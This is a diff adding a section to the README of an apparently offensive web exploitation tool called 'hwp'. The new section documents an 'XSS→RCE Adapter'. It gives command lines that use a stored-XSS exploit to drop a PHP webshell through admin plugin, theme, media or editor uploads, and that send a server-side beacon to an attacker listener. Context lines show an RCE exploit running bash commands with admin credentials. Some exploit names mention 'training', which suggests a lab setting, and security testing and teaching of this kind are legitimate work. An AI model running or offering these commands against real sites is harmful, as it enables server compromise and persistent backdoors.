@@ -106,6 +106,28 @@ hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "
 hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "id" --user admin --pass secret
 ```
 
+## XSS→RCE Adapter
+
+Escalate a stored-XSS exploit to RCE by delivering an RCE payload through it.
+Enable it with `--xss-rce-adapter`:
+
+```bash
+# Drop a webshell via a stored-XSS exploit
+hwp -t http://target.com --exploit hwp-training/1.0.0-xss --payload webshell --xss-rce-adapter
+
+# Confirm server-side execution with a beacon (proves true RCE)
+hwp -t http://target.com --exploit hwp-training/1.0.0-xss --payload webshell --xss-rce-adapter --lhost 10.0.0.5 --lport 8888
+
+# Watch the in-browser sink chain in devtools
+hwp -t http://target.com --exploit hwp-training/1.0.0-xss --payload webshell --xss-rce-adapter --adapter-debug
+```
+
+The payload is stored as admin-context JS. When an authenticated admin loads an
+injected page, the JS drops the payload's PHP onto the server (trying plugin and
+theme upload, media upload, then editor sinks) and triggers it. With
+`--lhost`/`--lport` set, a server-side beacon confirms execution. See
+[Framework Internals](docs/framework.md) → *XSS→RCE Adapter*.
+
 ## Verbose Output
 
 ```bash
